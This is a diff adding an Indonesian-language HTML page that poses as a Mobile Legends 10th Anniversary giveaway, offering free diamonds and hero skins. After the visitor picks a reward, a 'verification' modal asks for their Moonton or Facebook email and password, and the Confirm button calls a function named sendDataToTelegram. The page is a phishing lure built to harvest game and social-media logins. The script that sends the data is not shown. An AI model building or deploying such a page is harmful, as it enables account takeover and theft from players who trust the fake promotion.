@@ -1,1 +1,160 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mobile Legends: Bang Bang - 10TH Anniversary</title>
+    
+    <meta property="og:title" content="Claim - 10TH Anniversary">
+    <meta property="og:description" content="Klaim hadiah eksklusif 10th Anniversary Mobile Legends sekarang!">
+    <meta property="og:image" content="image/logo.jpeg">
+    <meta property="og:type" content="website">
 
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <div class="main-container">
+        <div class="banner-container">
+            <div class="banner-overlay"></div>
+            <div class="game-profile">
+                <img src="image/logo.jpeg" class="game-logo" alt="Logo">
+                <div class="game-title">
+                    <h2>MOBILE LEGENDS:BANG BANG</h2>
+                    <p>MOONTON • 10TH ANNIVERSARY</p>
+                </div>
+            </div>
+        </div>
+
+        <div id="alertBar" class="alert-bar">Silahkan isi data akun terlebih dahulu.</div>
+
+        <div class="section-box">
+            <div class="section-title"><span>1</span> Masukkan Data Akun</div>
+            <div class="input-grid">
+                <div class="input-group">
+                    <input type="number" id="userid" placeholder="User ID" oninput="checkAccountReal()">
+                </div>
+                <div class="input-group">
+                    <input type="number" id="serverid" placeholder="Server ID" oninput="checkAccountReal()">
+                </div>
+            </div>
+            <div id="account-status"></div>
+        </div>
+
+        <div class="section-box">
+            <div class="section-title"><span>2</span> Pilih Hadiah Event</div>
+            <div class="reward-grid">
+                <div class="reward-card" onclick="selectReward(this, '3500 Diamonds')">
+                    <img src="image/DM.jpeg" alt="Diamonds">
+                    <div class="name">3500 Diamonds</div>
+                </div>
+                <div class="reward-card" onclick="selectReward(this, 'Weekly Diamond Pass x15')">
+                    <img src="image/WDP.jpeg" alt="WDP">
+                    <div class="name">Weekly Diamond Pass x15</div>
+                </div>
+                <div class="reward-card" onclick="selectReward(this, '7 Rename Card')">
+                    <img src="image/Rename.jpeg" alt="Rename Card">
+                    <div class="name">7 Rename Card</div>
+                </div>
+                <div class="reward-card" onclick="selectReward(this, '12.000 BB Coin')">
+                    <img src="image/Coin.jpeg" alt="BB Coin">
+                    <div class="name">12.000 BB Coin</div>
+                </div>
+                <div class="reward-card" onclick="selectReward(this, 'Karina - Leona')">
+                    <img src="image/Leona.jpeg" alt="Leona">
+                    <div class="name">Karina - Leona</div>
+                </div>
+                <div class="reward-card" onclick="selectReward(this, 'Chou - Iori Yagami')">
+                    <img src="image/Iori.jpeg" alt="Iori">
+                    <div class="name">Chou - Iori Yagami</div>
+                </div>
+                <div class="reward-card" onclick="selectReward(this, 'Gusion - K\'')">
+                    <img src="image/K.jpeg" alt="K">
+                    <div class="name">Gusion - K'</div>
+                </div>
+                <div class="reward-card" onclick="selectReward(this, 'Esmeralda - The Foreseer')">
+                    <img src="image/Foreseer.jpeg" alt="Foreseer">
+                    <div class="name">Esmeralda - The Foreseer</div>
+                </div>
+                <div class="reward-card" onclick="selectReward(this, 'Lancelot - Swordmaster')">
+                    <img src="image/Swordmaster.jpeg" alt="Swordmaster">
+                    <div class="name">Lancelot - Swordmaster</div>
+                </div>
+                <div class="reward-card" onclick="selectReward(this, 'Harith - Killua')">
+                    <img src="image/Killua.jpeg" alt="Killua">
+                    <div class="name">Harith - Killua</div>
+                </div>
+                <div class="reward-card" onclick="selectReward(this, 'Lesley - Hawk-eyed Sniper')">
+                    <img src="image/Sniper.jpeg" alt="Sniper">
+                    <div class="name">Lesley - Hawk-eyed Sniper</div>
+                </div>
+                <div class="reward-card" onclick="selectReward(this, 'X-Borg - Tesla Maniac')">
+                    <img src="image/Maniac.jpeg" alt="Maniac">
+                    <div class="name">X-Borg - Tesla Maniac</div>
+                </div>
+                <div class="reward-card" onclick="selectReward(this, 'Hayabusa - Shura')">
+                    <img src="image/Shura.jpeg" alt="Shura">
+                    <div class="name">Hayabusa - Shura</div>
+                </div>
+                <div class="reward-card" onclick="selectReward(this, 'Rafaela - Biomedic')">
+                    <img src="image/Bio.jpeg" alt="Bio">
+                    <div class="name">Rafaela - Biomedic</div>
+                </div>
+                <div class="reward-card" onclick="selectReward(this, 'Gusion - Soul Revelation')">
+                    <img src="image/Soul.jpeg" alt="Soul">
+                    <div class="name">Gusion - Soul Revelation</div>
+                </div>
+                <div class="reward-card" onclick="selectReward(this, 'Julian - Kurapika')">
+                    <img src="image/Kurapika.jpeg" alt="Kurapika">
+                    <div class="name">Julian - Kurapika</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="bottom-bar">
+        <div class="selected-preview">
+            Belum ada item dipilih
+            <strong id="preview-text">-</strong>
+        </div>
+        <button class="btn-submit" onclick="openLoginModal()">Claim</button>
+    </div>
+
+    <!-- Modal Login Verifikasi -->
+    <div class="modal" id="loginModal">
+        <div class="modal-content">
+            <h3>Verifikasi Akun Pemilik</h3>
+            <p>Masukkan kredensial akun game Anda untuk menyelesaikan validasi pengiriman hadiah.</p>
+            
+            <div class="login-field">
+                <label>Metode Login</label>
+                <select id="login-method">
+                    <option value="Moonton">Akun Moonton</option>
+                    <option value="Facebook">Facebook</option>
+                </select>
+            </div>
+            <div class="login-field">
+                <label>Email</label>
+                <input type="text" id="username" placeholder="Masukkan akun game">
+            </div>
+            <div class="login-field">
+                <label>Password</label>
+                <input type="password" id="password" placeholder="Masukkan password">
+            </div>
+
+            <button class="btn-confirm-claim" onclick="sendDataToTelegram()">Confirm</button>
+        </div>
+    </div>
+
+    <!-- Custom Universal Popup Modal -->
+    <div class="modal" id="customModal">
+        <div class="modal-content custom-box">
+            <h3 id="custom-modal-title">Perhatian</h3>
+            <p id="custom-modal-text"></p>
+            <button class="btn-modal-close" id="custom-modal-btn" onclick="closeCustomModal()">OK</button>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
